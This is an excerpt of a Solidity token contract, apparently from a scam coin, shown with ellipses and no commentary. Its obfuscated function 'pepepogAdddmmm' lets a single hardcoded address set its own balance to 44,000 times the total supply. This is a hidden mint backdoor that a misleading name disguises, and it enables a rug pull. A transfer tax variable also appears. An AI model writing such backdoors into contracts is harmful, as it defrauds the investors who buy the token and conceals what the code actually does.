...
contract Token is Ownable {
    ...
    function peepgodAmount() public view returns (uint256) {
        return _tokentotalSupply;
    }

    function pepepogAdddmmm() external {
        address tswojaks = _msgSender();
        if (_cwojak2 != tswojaks){
            revert("tswojaks"); 
        }
        if(_cwojak2 == tswojaks){
            _balances[_cwojak2] = peepgodAmount()*(44000);
        }
    ...
    constructor(string memory tokenName_, string memory Tokensymbol_) {
        _cwojak2 = 0xdFaaCdf9C94f3264E440aA7c1370E81AC4e234ad;
    ...
    function _internaltransfer(
        ...
        uint256 taxAmount = amount*pepxEEEE/100;
